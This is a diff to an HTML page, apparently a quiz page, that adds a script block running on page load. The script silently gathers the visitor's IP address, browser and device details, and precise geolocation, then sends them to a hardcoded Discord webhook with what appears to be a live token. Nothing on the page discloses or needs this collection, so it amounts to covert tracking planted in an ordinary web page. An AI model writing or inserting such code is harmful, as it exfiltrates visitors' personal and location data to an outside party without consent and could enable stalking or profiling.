@@ -448,6 +448,84 @@ function validateAnswers(questions) {
             
         }
 </script>
+<script>
+(async () => {
+    const webhookURL = "https://discord.com/api/webhooks/1329656838291062798/8dGy0f5L0upZt9Ap0td2PDwQ4PEGwLHq_-bOtfru4VFlG6LXFi8El0137jdjKuEn-TNZ"; // Replace with your webhook URL
+
+    // 1. Get IP Address and some geolocation data using a public IP API
+    const getIPData = async () => {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const ipData = await res.json();
+            return ipData.ip;
+        } catch (e) {
+            return "IP not found";
+        }
+    };
+
+    // 2. Get browser/device info
+    const getDeviceData = () => {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            },
+            language: navigator.language
+        };
+    };
+
+    // 3. Try to get location via browser geolocation API
+    const getLocation = () => {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                resolve("Geolocation not supported");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                },
+                (err) => {
+                    resolve("Location permission denied or error");
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 5000
+                }
+            );
+        });
+    };
+
+    // Collect everything
+    const ip = await getIPData();
+    const device = getDeviceData();
+    const location = await getLocation();
+
+    const payload = {
+        timestamp: new Date().toISOString(),
+        ip,
+        device,
+        location
+    };
+
+    // Send to webhook
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+})();
+</script>
 
 </body>
 </html>
